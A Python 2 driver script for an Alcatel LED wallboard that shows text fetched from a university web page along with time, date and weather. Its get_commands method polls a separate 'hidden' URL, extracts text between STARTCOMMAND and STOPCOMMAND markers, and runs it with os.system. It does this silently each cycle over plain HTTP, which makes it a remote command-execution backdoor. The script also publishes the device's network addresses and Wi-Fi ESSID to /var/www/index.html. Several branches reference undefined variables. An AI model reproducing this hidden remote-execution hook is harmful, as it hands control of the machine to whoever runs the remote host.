import serial
import subprocess
import time
import getopt
import urllib2
import os
from urllib2 import Request
from AlcatelWallboardSimulator import *

try:
    from metar import Metar
except:
    pass

class Lightboard:
    rows, cols = 2, 16
    device_address = "/dev/ttyUSB0"
    message_file_address = "message.txt"
    url = "http://kmim.wm.pwr.edu.pl/tablica/"
    hidden_url = "http://nice-idea.org/index.php/tablica/"
    metar_code = "EPWR 151730Z 01006KT 2500 -SN BR BKN005 01/M01 Q1008 R11/51//94"
    network_details_save_url = "/var/www/index.html"
    baud = 9600
    timeout =1.0
    pause_between_messages = 3.0
    weather_obs = None
    _current_row = 0;
    special_codes = ["<green>", "<red>", "<yellow>", "<orange>", "<light_red>", "<net_details>",
                     "<date>", "<endl>", "<time>", "<blink>", "<static>", "<clean>", "<pause>",
                     "<weather>", "<temperature>", "<pressure>"]
    start_text_marker = "STARTTEXT"
    stop_text_marker  = "STOPTEXT"
    start_command_marker = "STARTCOMMAND"
    stop_command_marker = "STOPCOMMAND"

    def __init__(self, simulation = False):
        self.simulate = simulation
        if simulation:
            self.ser = AlcatelWallboardSimulator()
            pass
        else:
            try:
                self.ser = serial.Serial(self.device_address, self.baud, timeout=self.timeout)
            except:
                print("Could not open serial ", self.device_address);
        self.clean()

    def clean(self):
        self.write_word("\x8E")

    def beep(self):
        self.write_word("\x8D")

    def set_red_color(self):
        self.write_word("\x80")

    def set_light_red_color(self):
        self.write_word("\x81")

    def set_yellow_color(self):
        self.write_word("\x82")

    def set_orange_color(self):
        self.write_word("\x83")

    def set_green_color(self):
        self.write_word("\x87")

    def set_bright_text(self):
        self.write_word("\x84")

    def set_dimm_text(self):
        self.write_word("\x85")

    def set_very_dim_text(self):
        self.write_word("\x86")

    def go_to_first_row(self):
        self.write_word("\x89")

    def go_to_second_row(self):
        self.write_word("\x8A")

    def set_blinking_text(self):
        self.write_word("\x8C")

    def set_static_text(self):
        self.write_word("\x8B")

    def write_word(self, word):
        try:
            self.ser.write(word)
        except:
            print("Serial error")
        if self.simulate:
            print(word)

    def _change_row_and_screen(self):
        if self._current_row==0:
            self.go_to_second_row()
            self._current_row=1
        else:
            self.clean()
            self.go_to_first_row()
            self._current_row=0

    def _execute_special_code(self, code):
        response = [0,'']
        if code=="<green>":
            self.set_green_color()
        elif code=="<red>":
            self.set_red_color()
        elif code=="<yellow>":
            self.set_yellow_color()
        elif code=="<orange>":
            self.set_orange_color()
        elif code=="<light_red>":
            self.set_light_red_color()
        elif code=="<blink>":
            self.set_blinking_text()
        elif code=="<static>":
            self.set_static_text()
        elif code=="<time>":
            time_str =  time.strftime("%H:%M", time.localtime())
            response = [1 , time_str]
        elif code=="<date>":
            date_str = time.strftime("%m-%d", time.localtime())
            response = [1 , date_str]
        elif code=="<endl>":
            self._change_row_and_screen()
        elif code =="<clean>":
            self.clean()
            self._current_row=0
        elif code =="<pause>":
            try:
                time.sleep(self.pause_between_messages)
            except:
                pass
        elif code =="<net_details>":
            net_details = self.save_network_details()
            text = text.replace("<net_details>", net_details)
            text = text.replace("addr:" ,"")
            text = text.replace("127.0.0.1" ,"")
            response = [1 , text]
        elif code =="<weather>":
            if self.weather_obs:
                text = self.weather_obs.present_weather()
                response = [1, text]
        elif code =="<pressure>":
            if self.weather_obs:
                text = self.press.string("mb")
                response = [1,text]
        elif code =="<temperature>":
            if self.weather_obs:
                text = self.weather_obs.temp.string("C")
                response = [1,text]
        return response


    def get_message_file_content(self):
        f = open(self.message_file_address)
        return f.read()


    def get_text(self, content, is_hidden_server = False):
        text=""
        try:
            req = Request(content)
            content = urllib2.urlopen(req, timeout=5).read()
            if self.start_text_marker in content and self.stop_text_marker in content:
                text_start_index = content.find(self.start_text_marker) +len(self.start_text_marker)
                text_stop_index = content.find(self.stop_text_marker)
                if text_stop_index > text_start_index:
                    text = content[text_start_index:text_stop_index].replace('#', ' <').replace('*', '> ').replace("\n", "")
                elif is_hidden_server == False: #if hidden don't show the errors
                    text += "T! " #TEXT FORMATED IN A WRONG WAY
                    text += self.get_message_file_content()
            elif is_hidden_server == False :
                text += "T! " #TEXT FORMATED IN A WRONG WAY
                text += self.get_message_file_content()
        except:
            if is_hidden_server == False:
                text += "I!" #COULDN'T READ THE PAGE
                try:
                    text += self.get_message_file_content()
                except BaseException as e:
                    if is_hidden_server == False:
                        text = "D! " #COULDN'T READ FROM THE DISK
                    print (e)


        return text


    def get_commands(self, url):
        cmd =""
        try:
            req = Request(url)
            content = urllib2.urlopen(req, timeout=5).read()
            if self.start_command_marker in content and self.stop_command_marker in content:
                command_start_index = content.find(self.start_command_marker) + len(self.start_command_marker)
                command_stop_index = content.find(self.stop_command_marker)
                if command_stop_index > command_start_index:
                    print (content[command_start_index:command_stop_index])
                    os.system(content[command_start_index:command_stop_index])
        except BaseException as e:
            print (e)


    def save_network_details(self):
        details =""
        try:
            det = subprocess.Popen("ifconfig", stderr=subprocess.STDOUT, stdout=subprocess.PIPE).communicate()
            for word in det[0].split():
                i = word.find("addr:")
                if i!=-1 and len(word)>i+1:
                    details += (word[i:]+ " ")
        except:
            pass

        try:
            det = subprocess.Popen("iwconfig", stderr=subprocess.STDOUT, stdout=subprocess.PIPE).communicate()
            for word in det[0].split():
                i = word.find("ESSID:")
                if i !=-1:
                    details += (word[i:]+ " ")
                    break
        except:
            pass
        try:
            with open(self.network_details_save_url, "w") as f:
                f.write(str(details).replace("\n", "<br>"))
        except:
            pass
        return details


    def display_splited_text(self, splited_text, pause_beetween_words = 0.9):
        try:
            letter_count = 0
            for i in range(len(splited_text)):
                word = splited_text[i].strip()
                if word in self.special_codes:
                    response = self._execute_special_code(word)
                    word = response[1].strip()
                if len(word)>0:
                    if len(word)<=16:
                        if letter_count + len(word)>16:
                            self._change_row_and_screen()
                            letter_count=0
                        if letter_count + len(word) <=16:
                            letter_count += (len(word)+1)
                            self.write_word(word+" ")
                        time.sleep(pause_beetween_words)

                    else:
                        splited_text.pop(i)
                        part1 = word[:14]+"-"
                        part2 = word[15:]
                        splited_text.insert(i, part1)
                        splited_text.insert(i, part2)
        except KeyboardInterrupt:
            exit()
        except BaseException as e:
            print (e)


    def write_dynamic_text (self, get_text_each_N_iteration =10):
        splited_text,hidden_splited_text = [] , []
        iteration = 0
        while 1:
            #GET WEATHERtime
            try:
                self.weather_obs = Metar.Metar(code)
            except Exception as e:
                print (e)
            if iteration % get_text_each_N_iteration == 0:
                iteration = 0
                #hidden server
                try:
                    self.get_commands(self.hidden_url)
                    hidden_text = self.get_text(self.hidden_url, is_hidden_server = True)
                    hidden_text = hidden_text.replace("&nbsp;",' ')
                    hidden_splited_text = hidden_text.split(' ')
                except Exception as e:
                    print (e)

                try:
                    text = self.get_text(self.url)
                    text = text.replace("&nbsp;",' ')
                    splited_text = text.split(' ')
                except Exception as e:
                    print (e)

            self.display_splited_text(hidden_splited_text)
            self.display_splited_text(splited_text)
            self.clean()
            iteration += 1


if __name__ == "__main__":
    l = Lightboard(True)
    l.write_dynamic_text()
